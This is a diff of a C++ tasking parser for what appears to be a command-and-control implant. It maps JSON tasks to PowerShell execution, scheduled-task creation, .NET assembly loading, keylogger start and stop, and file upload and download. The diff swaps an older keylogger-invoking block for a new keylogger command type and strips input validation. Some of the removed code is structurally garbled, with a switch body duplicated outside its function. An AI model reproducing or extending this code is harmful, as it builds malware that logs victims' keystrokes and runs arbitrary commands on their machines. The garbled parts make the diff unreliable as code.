@@ -3,10 +3,6 @@
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
 #include "Task.h"
-#include <Keylogger.h>
-
-#define SUCCESSFUL "Successful"
-#define FAILURE "Failure"
 
 Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 {
@@ -22,92 +18,50 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 
 	switch (type)
 	{
-		case POWERSHELL:
-		{
-			auto cmd = node["Commandlet"].GetString();
-			auto arg = node["Arguements"].GetString();
-			return CreateTaskRequest<CommandPowershell>(taskID, type, code, status, CommandPowershell{ cmd, arg });
-		}
-		case WIN_TASK:
-		{
-			auto path = node["Path"].GetString();
-			auto username = node["Username"].GetString();
-			auto taskName = node["TaskName"].GetString();
-			return CreateTaskRequest<CommandWinTask>(taskID, type, code, status, CommandWinTask{ path, username, taskName });
-		}
-		case NET_ASM:
-		{
-			auto args = node["Arguments"].GetString();
-			auto assmebly = node["Assembly"].GetString();
-			return CreateTaskRequest<CommandNetAsm>(taskID, type, code, status, CommandNetAsm{ args, assmebly });
-		}
-	}
-	TaskRequest<bool> test;
-	return test;
-}
-
-	case KEYLOGGER_START:
-	{
-		Keylogger keylogger;
-		keylogger.keylog_start();
-		return CreateTaskRequest<Keylogger>(taskID, KEYLOGGER_START, NO_CODE, RUNNING, TaskSuccess{""});
-	}
-	break;
-
-	case KEYLOGGER_STOP:
-	{
-		Keylogger keylogger;
-		keylogger.keylog_stop();
-		std::string result = keylogger.get_keylog_data(taskID).data;
-		return CreateTaskRequest<Keylogger>(taskID, KEYLOGGER_STOP, NO_CODE, SUCCESS, TaskSuccess{result});
-	}
-	break;
-
 	case POWERSHELL:
+	{
 		auto cmd = node["Commandlet"].GetString();
 		auto arg = node["Arguements"].GetString();
 		return CreateTaskRequest<CommandPowershell>(taskID, type, code, status, CommandPowershell{cmd, arg});
-		break;
+	}
+	case WIN_TASK:
+	{
+		auto path = node["Path"].GetString();
+		auto username = node["Username"].GetString();
+		auto taskName = node["TaskName"].GetString();
+		return CreateTaskRequest<CommandWinTask>(taskID, type, code, status, CommandWinTask{path, username, taskName});
+	}
+	case NET_ASM:
+	{
+		auto args = node["Arguments"].GetString();
+		auto assmebly = node["Assembly"].GetString();
+		return CreateTaskRequest<CommandNetAsm>(taskID, type, code, status, CommandNetAsm{args, assmebly});
+	}
+	case KEYLOGGER:
+	{
+		auto action = node["Action"].GetInt();
 
+		return CreateTaskRequest<CommandKeylogger>(taskID, type, code, status, CommandKeylogger{});
+	}
 	case UPLOAD:
 	{
-		if (!node.HasMember("Path") || !node["Path"].IsString())
-			return TaskRequest<bool>{};
+		auto path = node["Path"].GetString();
+		auto offset = node["Offset"].GetInt64();
 
-		return TaskRequest<CommandUploadFile>{
-			taskID, type, code, status,
-			CommandUploadFile{node["Path"].GetString()}};
+		return CreateTaskRequest<CommandUploadFile>(
+			taskID,
+			type,
+			code,
+			status,
+			CommandUploadFile{path, offset});
 	}
-
-	// TODO : CHANGE TO USE CreateTaskRequest
-	case DOWNLOAD_CHUNK:
+	case DOWNLOAD:
 	{
-		if (code != DOWNLOAD ||
-			!node.HasMember("Path") ||
-			!node["Path"].IsString())
-		{
-			return TaskRequest<bool>{};
-		}
-
-		const char *data =
-			node.HasMember("Data") && node["Data"].IsString()
-				? node["Data"].GetString()
-				: "";
-
-		const auto offset =
-			node.HasMember("Offset") && node["Offset"].IsInt64()
-				? node["Offset"].GetInt64()
-				: 0;
-
-		const auto totalBytes =
-			node.HasMember("TotalBytes") && node["TotalBytes"].IsInt64()
-				? node["TotalBytes"].GetInt64()
-				: 0;
-
-		const bool final =
-			node.HasMember("Final") && node["Final"].IsBool()
-				? node["Final"].GetBool()
-				: false;
+		auto path = node["Path"].GetString();
+		auto destinationPath = node["DestinationPath"].GetString();
+		auto data = node["Data"].GetString();
+		auto offset = node["Offset"].GetInt64();
+		auto final = node["Final"].GetBool();
 
 		return CreateTaskRequest<CommandDownloadFile>(
 			taskID,
@@ -115,18 +69,17 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 			code,
 			status,
 			CommandDownloadFile{
-				node["Path"].GetString(),
+				path,
+				destinationPath,
 				data,
 				offset,
-				totalBytes,
 				final});
 	}
-
-	default:
-		TaskRequest<bool> test;
-		return test;
 	}
+	TaskRequest<bool> test;
+	return test;
 }
+
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Default constructor
 TaskQueueManager::TaskQueueManager()
@@ -148,10 +101,6 @@ bool TaskQueueManager::HasPendingTask()
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 void TaskQueueManager::StoreTaskResult(Response &response)
 {
-	std::string json = std::visit([](const auto &responseEnvelope)
-								  { return responseEnvelope.StructToJson(); }, response);
-
-	taskResults.push(json);
 	taskResults.push_back(response);
 }
 
@@ -166,8 +115,6 @@ std::string TaskQueueManager::GetTaskResults()
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 void TaskQueueManager::QueueTask(std::string blob)
 {
-	if (blob.empty())
-		return;
 	if (blob.empty())
 		return;
 	if (blob.length() == 36)
